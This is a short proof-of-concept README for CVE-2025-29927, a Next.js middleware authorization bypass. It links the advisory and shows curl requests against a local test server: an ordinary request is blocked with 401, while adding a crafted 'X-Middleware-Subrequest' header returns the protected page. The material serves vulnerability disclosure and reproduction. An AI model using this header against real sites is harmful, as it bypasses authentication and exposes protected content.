# Next.js POC for CVE-2025-29927 

- [Authorization Bypass in Next.js Middleware · CVE-2025-29927 · GitHub Advisory Database](https://github.com/advisories/GHSA-f82v-jwr5-mffw)
- [Next.js and the corrupt middleware: the authorizing artifact - zhero_web_security](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)- 

## What is this?

This vulnerability allow to bypass middleware logics.

[src/middleware.ts](src/middleware.ts):
```ts
// always block any request
export function middleware() {
  return Response.json(
    { success: false, message: 'authentication failed' },
    { status: 401 }
  )
}
```

## Reproduce Steps

0. setup the environment

```bash
$ npm ci
$ npm exec next -- --version
Next.js v15.2.2
````

1. Run Server

```bash
$ npm run dev
```

2. Test middleware works

```
curl -v http://localhost:3000/
* Host localhost:3000 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:3000...
* Connected to localhost (::1) port 3000
> GET / HTTP/1.1
> Host: localhost:3000
> User-Agent: curl/8.7.1
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< content-type: application/json
< Vary: Accept-Encoding
< Date: Sun, 23 Mar 2025 08:24:13 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
* Connection #0 to host localhost left intact
{"success":false,"message":"authentication failed"}%
```

3. Bypass middleware using CVE-2025-29927

Add Header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` to the request

```
curl -v http://localhost:3000/ -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
* Host localhost:3000 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:3000...
* Connected to localhost (::1) port 3000
> GET / HTTP/1.1
> Host: localhost:3000
> User-Agent: curl/8.7.1
> Accept: */*
> X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
>
* Request completely sent off
< HTTP/1.1 200 OK
< Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
< link: </_next/static/media/569ce4b8f30dc480-s.p.woff2>; rel=preload; as="font"; crossorigin=""; type="font/woff2", </_next/static/media/93f479601ee12b01-s.p.woff2>; rel=preload; as="font"; crossorigin=""; type="font/woff2", </_next/static/css/app/layout.css?v=1742718989736>; rel=preload; as="style"
< Cache-Control: no-store, must-revalidate
< X-Powered-By: Next.js
< Content-Type: text/html; charset=utf-8
< Date: Sun, 23 Mar 2025 08:36:29 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1742718989736" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=1742718989736"/><script src="/_next/static/chunks/main-app.js?v=1742718989736" async=""></script><script src="/_next/static/chunks/app-pages-internals.js" async=""></script><meta name="next-size-adjust" content=""/><title>Create Next App</title><meta name="description" content="Generated by create next app"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16"/><script src="/_next/static/chunks/polyfills.js" noModule=""></script></head><body class="__variable_4d318d __variable_ea5f4b antialiased"><h1>Secret Page</h1><!--$--><!--/$--><!--$--><!--/$--><script src="/_next/static/chunks/webpack.js?v=1742718989736" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1 ....
```
